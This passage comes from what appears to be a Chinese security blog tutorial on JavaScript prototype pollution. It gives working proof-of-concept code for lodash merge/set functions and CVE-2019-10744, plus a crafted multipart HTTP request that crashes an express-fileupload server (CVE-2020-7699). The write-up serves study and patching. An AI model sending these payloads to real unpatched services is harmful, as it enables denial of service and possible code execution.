&lt;p>原因是因为我们在&lt;code>let o2 = {a: 1, &amp;quot;__proto__&amp;quot;: {b: 2}}&lt;/code>创建o2时，实际的两个键名是&lt;code>a, b&lt;/code>而不是&lt;code>a, __proto__&lt;/code>，&lt;code>__proto__&lt;/code>就不是一个key，自然也不会修改Object的原型（看起来很奇怪，但是就是这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220414112407556.png" alt="image-20220414112407556">&lt;/p>
&lt;p>让它被认做一个键名需要修改一下创建o2的方式&lt;code>let o2 = JSON.parse('{&amp;quot;a&amp;quot;: 1, &amp;quot;__proto__&amp;quot;: {&amp;quot;b&amp;quot;: 2}}')&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112520073.png" alt="image-20211216112520073">&lt;/p>
&lt;p>在JSON解析的情况下&lt;code>__proto__&lt;/code>被认作是键名而不是原型，所以成功了&lt;/p>
&lt;h3 id="由传入参数定义对象属性">由传入参数定义对象属性&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">theFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">value&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果&lt;code>path&lt;/code>和&lt;code>value&lt;/code>的值可以被我们指定，我们可以设定&lt;code>path = &amp;quot;__proto__.myValue&amp;quot;&lt;/code>，之后指定&lt;code>value&lt;/code>的值&lt;/p>
&lt;p>具体操作可见后面的CVE-2019-10795(undefsafe)，lodash.set&lt;/p>
&lt;h3 id="对象clone操作">对象&lt;code>clone&lt;/code>操作&lt;/h3>
&lt;blockquote>
&lt;p>&lt;em>Prototype pollution can happen with API that clone object when the API implements the clone as recursive merge on an empty object. Do note that merge function must be affected by the issue.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">clone&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">({},&lt;/span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="攻击实现">攻击实现&lt;/h2>
&lt;p>奈何不是很好归类，如果按攻击方式归类的话会出现重复的模块和不好分类的地方，呜呜呜呜呜呜，好乱&lt;/p>
&lt;h3 id="对象merge操作-1">对象&lt;code>merge&lt;/code>操作&lt;/h3>
&lt;h4 id="lodashmergewith">lodash.mergeWith&lt;/h4>
&lt;p>类似lodash.merge，多接收一个参数customizer&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">mergeWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">sources&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">customizer&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果是undefined就跟merge一样了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;{&amp;#34;__proto__&amp;#34;:{&amp;#34;whoami&amp;#34;:&amp;#34;Vulnerable&amp;#34;}}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Before whoami: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mergeWith&lt;/span>&lt;span style="color:#111">({},&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;After whoami: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="由传入参数定义对象属性-1">由传入参数定义对象属性&lt;/h3>
&lt;h4 id="lodashset">lodash.set&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>设置值到对象对应的属性路径上&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[{&lt;/span> &lt;span style="color:#d88200">&amp;#39;b&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">}]&lt;/span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// undefined
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__proto__.[&amp;#34;whoami&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Vulnerable&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Vulnerable
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="lodashsetwith">lodash.setWith&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">setWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">customizer&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>POC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[{&lt;/span> &lt;span style="color:#d88200">&amp;#39;b&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">}]&lt;/span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// undefined
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">lodash&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__proto__.[&amp;#34;whoami&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Vulnerable&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object_1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Vulnerable
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="lodashdefaultsdeepcve-2019-10744">lodash.defaultsDeep/CVE-2019-10744&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">mergeFn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">defaultsDeep&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;{&amp;#34;constructor&amp;#34;: {&amp;#34;prototype&amp;#34;: {&amp;#34;a0&amp;#34;: true}}}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mergeFn&lt;/span>&lt;span style="color:#111">({},&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(({})[&lt;/span>&lt;span style="color:#d88200">`a0`&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Vulnerable to Prototype Pollution via &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="污染tostringvalueof方法造成500">污染&lt;code>toString&lt;/code>&amp;amp;&lt;code>valueOf&lt;/code>方法造成500&lt;/h3>
&lt;h4 id="express-fileupload---cve-2020-7699">express-fileupload - CVE-2020-7699&lt;/h4>
&lt;ul>
&lt;li>版本要求：express-fileupload &amp;lt; 1.1.8; &lt;code>parseNested = true&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>express-fileupload模块可为express应用提供文件上传功能，该漏洞可引发DOS，配合EJS等模板引擎可以达到rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npm i express-fileupload@1.1.7-alpha.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>定位到关键代码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216160955128.png" alt="image-20211216160955128">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216161010706.png" alt="image-20211216161010706">&lt;/p>
&lt;p>当&lt;code>parseNested&lt;/code>为ture，就会实现&lt;code>processNested&lt;/code>方法，与上文提到的&lt;code>merge&lt;/code>方法很类似，但是他会对传入的字典进行一个离谱的分析，当我们传入&lt;/p>
&lt;pre tabindex="0">&lt;code>{&amp;#34;a.b.c&amp;#34;: &amp;#34;whoami&amp;#34;}
&lt;/code>&lt;/pre>&lt;p>返回的是&lt;/p>
&lt;pre tabindex="0">&lt;code>{ a: { b: { c: &amp;#39;whoami&amp;#39; } } }
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162149919.png" alt="image-20211216162149919">&lt;/p>
&lt;p>那我们要是传入&lt;/p>
&lt;pre tabindex="0">&lt;code>{&amp;#34;__proto__.toString&amp;#34;:&amp;#34;whoami&amp;#34;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162722845.png" alt="image-20211216162722845">&lt;/p>
&lt;p>可以看到我们雀食把Object对象的&lt;code>toString&lt;/code>方法给污染为了whoami&lt;/p>
&lt;p>一个完整的栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fileupload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-fileupload&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fileupload&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">parseNested&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-fileupload poc&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url: http://%s:%s/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.18.1:3000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=--------1566035451&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">134&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>----------1566035451
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;__proto__.toString&amp;#34;; filename=&amp;#34;filename&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>whoami
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>----------1566035451--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163633664.png" alt="image-20211216163633664">&lt;/p>
&lt;p>之后再次刷新我们的http页面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163655473.png" alt="image-20211216163655473">&lt;/p>
&lt;p>已经成功崩坏了&lt;/p>
&lt;h4 id="undefsafe---cve-2019-10795">undefsafe - CVE-2019-10795&lt;/h4>
&lt;ul>
&lt;li>版本要求：Undefsafe &amp;lt; 2.0.3&lt;/li>
&lt;/ul>
